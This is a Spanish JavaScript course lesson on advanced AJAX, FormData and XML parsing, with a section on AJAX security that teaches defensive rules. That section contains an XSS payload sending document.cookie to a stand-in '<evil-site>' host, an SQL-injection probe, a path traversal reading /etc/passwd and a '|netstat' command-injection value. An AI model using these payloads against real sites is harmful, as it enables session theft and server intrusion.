![shieldsIO](https://img.shields.io/github/issues/Fictizia/Master-en-programacion-fullstack-con-JavaScript-y-Node.js_ed3.svg)
![shieldsIO](https://img.shields.io/github/forks/Fictizia/Master-en-programacion-fullstack-con-JavaScript-y-Node.js_ed3.svg)
![shieldsIO](https://img.shields.io/github/stars/Fictizia/Master-en-programacion-fullstack-con-JavaScript-y-Node.js_ed3.svg)

![WideImg](http://fictizia.com/img/github/Fictizia-plan-estudios-github.jpg)

# Máster en Programación FullStack con JavaScript y Node.js
### JS, Node.js, Frontend, Backend, Firebase, Express, Patrones, HTML5_APIs, Asincronía, Websockets, Testing

## Clase 17

### Herramientas esenciales
- [Insomnia](https://insomnia.rest/)
- [Jsonviewer](http://jsonviewer.stack.hu/)
- [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop)

### Ajax avanzado

### Ajax avanzado: Verbos HTTP

**JSON remplazando formularios**

```html
<form action="/action_page.php" method="post" enctype="application/x-www-form-urlencoded">
	<input type="text" name="name" placeholder="First name">
	<input type="submit" value="Enviar">
</form>
```

```javascript
var nombreDato = 'Yo mismo';
var xhr = new XMLHttpRequest();
xhr.open('POST', '/action_page.php');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onload = function() {
    if (xhr.status === 200 && xhr.responseText !== nombreDato) {
        console.log('Todo bien! Respuesta:', xhr.responseText);
    }
    else if (xhr.status !== 200) {
        console.log('Algo va mal. Codigo de estado:', xhr.status);
    }
};
xhr.send(encodeURI('name=' + nombreDato));

```

**Mandar un JSON limpio vía POST**
```javascript
var nombreDato = 'Yo mismo';
var xhr = new XMLHttpRequest();
xhr.open('POST', '/action_page.php');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.onload = function() {
    if (xhr.status === 200) {
        console.log("respuesta:", JSON.parse(xhr.responseText));
    }
};

xhr.send(JSON.stringify({
  "name": nombreDato
}));
```


### Ajax avanzado: Cabeceras personalizadas y credenciales

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://someotherdomain.com');
xhr.withCredentials = true; // Cookies
xhr.setRequestHeader('Content-Type', 'text/plain'); // header personal
xhr.onload = function() {
    if (xhr.status === 200) {
        console.log("respuesta:", JSON.parse(xhr.responseText));
    }
};
xhr.send('sometext');
```

**Recursos**
- [XMLHttpRequest.withCredentials](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials)
- [XMLHttpRequest.setRequestHeader()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader)
- [Forbidden response header name](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_response_header_name)
- [Forbidden header name](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)


### Ajax: FormData, una gran incentivo

Ejemplo sencillo
```javascript
var formData = new FormData();

formData.append("usuario", "Ulises");
formData.append("id", 123456); // todo se convierte a String

// Contenido desde un <input type="file"> desde el HTML
formData.append("fichero1", fileInputElement.files[0]);

// Fichero creado al vuelo con JavaScript
var content = '<a id="a"><b id="b">hey!</b></a>'; // El contenido del nuevo fichero
var blob = new Blob([content], { type: "text/xml"});

formData.append("otro_fichero", blob);

var request = new XMLHttpRequest();
request.open("POST", "http://myserver.com/submitData");
request.send(formData);
```

Ejemplo partiendo de un formulario existente
```javascript
// Trae el formulario del HTML
var formElement = document.getElementById("myFormElement");
formData = new FormData(formElement);
//Añade más información
formData.append("serialnumber", serialNumber++);
//Enviando los datos...
var request = new XMLHttpRequest();
request.open("POST", "http://myserver.com/submitData");
request.send(formData);
```

**Recursos**
- [Usando Objetos FormData](https://developer.mozilla.org/es/docs/Web/Guide/Usando_Objetos_FormData)
- [Uploading Files with AJAX](http://blog.teamtreehouse.com/uploading-files-ajax)


### Ajax avanzado: Otros usos

**Usando eventos y más...**
```javascript
var request = new XMLHttpRequest();

// Seleccionamos un fichero para subir
data.append('file', document.querySelector('#upload-file').files[0]);

request.addEventListener('load', function(e) {
	console.log("Content-Type:", request.getResponseHeader("Content-Type"))
	console.log(request.response);
});

// Gestión del progreso de subida....
request.upload.addEventListener('progress', function(e) {
	var percent_complete = (e.loaded / e.total)*100;
	console.log("Llevamos un", percent_complete+"%");
});

// Ajustamos la respuesta del servidor a fichero json, evitando la codificación errónea
request.responseType = 'json';
request.open('post', 'upload.php'); 
request.send(data);
```

**Abortar la carga**
```javascript
var xhr = new XMLHttpRequest(),
    method = "GET",
    url = "https://fictizia.com/";
xhr.open(method, url, true);

xhr.send();

if (condicion) {
  xhr.abort();
}
```

**Un mundo de posibilidades...**
- [XMLHttpRequest.responseXML](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML)
- [XMLHttpRequest.responseType](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseType)
- [XMLHttpRequest.upload](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/upload)
- [XMLHttpRequest.timeout](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/timeout)
- [XMLHttpRequest.getAllResponseHeaders()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getAllResponseHeaders)
- [XMLHttpRequest.getResponseHeader()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getResponseHeader)
- [XMLHttpRequest.overrideMimeType()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/overrideMimeType)

### Lidiar con eXtensible Markup Language (XML)

![img](../assets/clase17/45a1f0df-97dc-43b8-8511-91b8250b2777.png)

> XML, siglas en inglés de eXtensible Markup Language, traducido como "Lenguaje de Marcado Extensible" o "Lenguaje de Marcas Extensible", es un meta-lenguaje que permite definir lenguajes de marcas desarrollado por el World Wide Web Consortium (W3C) utilizado para almacenar datos en forma legible. Proviene del lenguaje SGML y permite definir la gramática de lenguajes específicos (de la misma manera que HTML es a su vez un lenguaje definido por SGML) para estructurar documentos grandes. A diferencia de otros lenguajes, XML da soporte a bases de datos, siendo útil cuando varias aplicaciones deben comunicarse entre sí o integrar información.1​
> XML no ha nacido únicamente para su aplicación en Internet, sino que se propone como un estándar para el intercambio de información estructurada entre diferentes plataformas. Se puede usar en bases de datos, editores de texto, hojas de cálculo y casi cualquier cosa imaginable.
> [Wikipedia](https://es.wikipedia.org/wiki/Extensible_Markup_Language)

```xml
<!--
https://www.w3schools.com/xml/cd_catalog.xml
-->
<CATALOG>
    <CD>
        <TITLE>Empire Burlesque</TITLE>
        <ARTIST>Bob Dylan</ARTIST>
        <COUNTRY>USA</COUNTRY>
        <COMPANY>Columbia</COMPANY>
        <PRICE>10.90</PRICE>
        <YEAR>1985</YEAR>
    </CD>
    <CD>
        <TITLE>Hide your heart</TITLE>
        <ARTIST>Bonnie Tyler</ARTIST>
        <COUNTRY>UK</COUNTRY>
        <COMPANY>CBS Records</COMPANY>
        <PRICE>9.90</PRICE>
        <YEAR>1988</YEAR>
    </CD>
</CATALOG>
```

```javascript
function loadXML(url, cb) {
  var request = new XMLHttpRequest();
  request.onreadystatechange = function() {
    if (request.readyState == 4 && request.status == 200) {
        cb(request.responseXML);
    }
  };
  request.open("GET", url, true);
  request.send();
}

function directParser (item, property){
    return item.getElementsByTagName(property)[0].childNodes[0].nodeValue
}

loadXML("cd_catalog.xml", function(data){
    var discos = data.getElementsByTagName("CD");
    
    for (var i = 0; i < discos.length; i++) {
        var disco  = discos[i];
        console.log("---------------------")
        console.log("Título:", directParser(disco, "TITLE"))
        console.log("Artista:", directParser(disco, "ARTIST"))
        console.log("Año:", directParser(disco, "YEAR"))
    }
}); 
```

```
---------------------
Título: Empire Burlesque
Artista: Bob Dylan
Año: 1985
---------------------
Título: Hide your heart
Artista: Bonnie Tyler
Año: 1988
...
```


https://www.w3schools.com/xml/ajax_xmlfile.asp

### Seguridad AJAX

```javascript
// <evil-site>.com/hacked 
// {data:"<script>alert("¡Sorpresa!")</script>"}

var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://<evil-site>.com/hacked');
xhr.onload = function() {
    if (xhr.status === 200) {
    	var respuesta = JSON.parse(xhr.responseText)
        console.log("respuesta:", respuesta);
        document.body.innerHTML = respuesta.data
    }
};
xhr.send();
```

**Normas básicas**
- Usar `innerText` y no `innerHtml`
- Nunca jamas usar `eval`
- Nunca encriptar en cliente
- No confies en la lógica del front


**Recursos**

- [Is Your Website Hackable?](https://www.acunetix.com/websitesecurity/ajax/)
- [AJAX Security Cheat Sheet](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet)
- [Testing for AJAX Vulnerabilities (OWASP-AJ-001)](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
- [Understanding Ajax vulnerabilities](https://www.ibm.com/developerworks/library/wa-vulnerabilities/index.html)
- [JSON Hijacking](https://haacked.com/archive/2009/06/25/json-hijacking.aspx/)
- [Ajax Security Basics](https://www.symantec.com/connect/articles/ajax-security-basics)
- [Top 10 Ajax Security Holes and Driving Factors](https://www.helpnetsecurity.com/2006/11/10/top-10-ajax-security-holes-and-driving-factors/)
- [20 high profile sites vulnerable to XSS attacks](https://www.acunetix.com/blog/news/full-disclosure-high-profile-websites-xss/)


### Seguridad AJAX: Tipos de Ataques

**Cross-site scripting (XSS)**
> Cross-site Scripting (XSS) is a technique by which malicious content is injected in the form of HTML/JavaScript code. XSS exploits can be used for triggering various other attacks like cookie theft, account hijacking, phishing, and denial of service.
> The Browser and AJAX Requests look identical, so the server is not able to classify them. Consequently, it won't be able to discern who made the request in the background. A JavaScript program can use AJAX to request a resource that occurs in the background without the user's knowledge. The browser will automatically add the necessary authentication or state-keeping information such as cookies to the request. JavaScript code can then access the response to this hidden request and then send more requests. This expansion of JavaScript functionality increases the possible damage of a Cross-Site Scripting attack.
> Also, an XSS attack could send requests for specific pages other than the page the user is currently looking at. This allows the attacker to actively look for certain content, potentially accessing the data.
> The XSS payload can use AJAX requests to autonomously inject itself into pages and easily re-inject the same host with more XSS (like a virus), all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user. 
> [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))


```html

<script>alert("howdy")</script>
<script>document.location='http://www.example.com/pag.pl?'%20+document.cookie</script>

<!--
This will just redirect the page to an unknown and malicious page after logging into the original page from where the request was made

http://example.com/login.php?variable="><script>document.location='http://<evil-site>/cont.php?'+document.cookie</script>
-->
```


- [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
- [OWASP Guide to Data Validation](https://www.owasp.org/index.php/Data_Validation)
- [Testing for DOM-based Cross site scripting (OTG-CLIENT-001)](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
- [Testing for Stored Cross site scripting (OTG-INPVAL-002)](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
- [Testing for Reflected Cross site scripting (OTG-INPVAL-001)](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))

**SQL Inyections**
> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))

```
--- The expected ---
Client:
    URL – Typically this would be something like http://www.example.com/rest/user/change_password
    POST data – {“email”:”xyz@example.com”, “oldpassword”:”oldpassword”, “newpassword”:”newpassword”}

Server:
    Password changed successfully.
```

```
--- SQL Injection Detection ---
Client:
    URL – Typically this would be something like http://www.example.com/rest/user/change_password
    POST data – {“email”:”xyz@example.com‘“,”oldpassword”:”oldpassword”, “newpassword”:”newpassword”}

Important:
    Qualys WAS tests if the web application is vulnerable to SQL injection attack 
    by appending the email parameter with SQL injection payload of a single quote (‘), 
    which results in the following data in the POST request:

Server:
    {"error":{"message":"SQLITE_ERROR: unrecognized token: 
    \"d5b5fffc89f961903fb3c9a173f1b667\"","stack":"Error: SQLITE_ERROR: 
    unrecognized token: \"d5b5fffc89f961903fb3c9a173f1b667\"\n at 
    Error (native)","errno":1,"code":"SQLITE_ERROR","sql":"UPDATE 
    Users set password = '5e9d11a14ad1c8dd77e98ef9b53fd1ba' WHERE 
    email = 'xyz@example.com'' AND 
    password = 'd5b5fffc89f961903fb3c9a173f1b667'"}}
```

```
--- Local File Inclusion Detection ---
Client:
    A typical e-commerce web application might have following request for searching of products:
    POST data – {“query”:”tv”,”order”:”asc”,”limit”:50}

Attack:
    POST data – {“query”:”/../../../../../../../etc/passwd”,”order”:”asc”,”limit”:50}

Server:
    You search for:
    /../../../../../../../etc/passwd</br>root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
```

```
--- PHP Command Injection Detection ---
Important: 
    The same e-commerce application is vulnerable to command injection vulnerability in the query parameter
Client:
    POST data – {“query”:”|netstat -an “,”order”:”asc”,”limit”:50}

Server:
    You searched for: |netstat -an
    
    Active Internet connections (servers and established)
    Proto  Recv-Q  Send-Q  Local Address     Foreign Address     State
    tcp      0       0     0.0.0.0:22           0.0.0.0:*        LISTEN
    tcp      0       0     127.0.0.1:631        0.0.0.0:*        LISTEN
    tcp      0       0     127.0.0.1:25         0.0.0.0:*        LISTEN
```


**AJAX Bridging**
> For security purposes, AJAX applications can only connect back to the Website from which they come. For example, JavaScript with AJAX downloaded from site1.com cannot make connections to site2.com. To allow AJAX to contact third-party sites in this manner, the AJAX service bridge was created. In a bridge, a host provides a Web service that acts as a proxy to forward traffic between the JavaScript running on the client and the third-party site. A bridge could be considered a 'Web service to Web service' connection. An attacker could use this to access sites with restricted access. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))

**Cross Site Request Forgery (CSRF)**
> CSRF attacks occur when an attacker forces a victim’s web browser to send an HTTP request to any website of his choosing (the intranet is a fair game as well). For example, while reading this post, the HTML/JavaScript code embedded in the web page could have forced your browser to make an off-domain request to your bank, blog, web mail, DSL router, etc. In case such applications are vulnerable, invisibly, CSRF could have transferred funds, posted comments, compromised email lists, or reconfigured the network. A characteristic of CSRF attacks is that the vulnerable application logs' will show what appear as legitimate entries originating from the victim, bearing no trace of the attack. This attack, though not common, has been done before. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))

**Denial of Service**
> Denial of Service is an old attack in which an attacker or vulnerable application forces the user to launch multiple XMLHttpRequests to a target application against the wishes of the user. In fact, browser domain restrictions make XMLHttpRequests useless in launching such attacks on other domains. Simple tricks such as using image tags nested within a JavaScript loop can do the trick more effectively. AJAX, being on the client-side, makes the attack easier. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))

`<img src="http://example.com/cgi-bin/ouch.cgi?a=b">`

### Datos Abiertos

- [Portal de datos abiertos del Ayuntamiento de Madrid](http://datos.madrid.es/portal/site/egob/)
- [Iniciativa de datos abiertos del Gobierno de España](http://datos.gob.es/)
- [EMT Datos Abiertos](http://opendata.emtmadrid.es/)
- [European Data Portal](https://www.europeandataportal.eu/)
- [Open NASA](https://open.nasa.gov/open-data/)
- [Datos Abiertos de Mexico](https://datos.gob.mx/)
- [The home of the U.S. Government’s open data](https://www.data.gov/)

### Ejercicios

**1 -** Utilizando la [API del NYTimes](http://developer.nytimes.com/docs) vamos a crear una web que nos muestre los libros más vendidos de la [categoria Hardcover Fiction](http://www.nytimes.com/best-sellers-books/2016-01-17/hardcover-fiction/list.html)

![NYT_logo](../assets/clase17/48756885-f5a5-48a3-af44-a82b1daecfe1.jpeg)

**Especificaciones:**
- [Consigue tus credenciales dandote de alta](https://myaccount.nytimes.com/auth/login?URI=http:/developer.nytimes.com/login/external)
- Debes incluir una animación mientras esperamos la carga del contenido.
- Los libros deben estar organizados según el orden de la lista oficial
- Debes incluir la carátula del libro
- Debes incluir la cantidad de semanas que lleva en la lista
- Debes incluir la descripción
- Debes incluir el titulo y la posición que ocupa en la lista ( #1 titulo.... #2 titulo....)
- Debes incluir el link para poder comprar el libro en amazon (debe abrirse en otra pestaña)

**Trucos:**
- Mira en detalle la [documentación oficial](http://developer.nytimes.com/docs)
- Usa el *[Books API](http://developer.nytimes.com/docs/books_api/)*

**Concepto:**

![NYTimes.png](../OTROS/NYTimes.png)

```javascript
    // Tu solución
```


### Tiempo para proyecto personal

![img_promo](../assets/clase17/34c9f060-cb0e-40b2-8e83-b2bec2bc22c3.gif)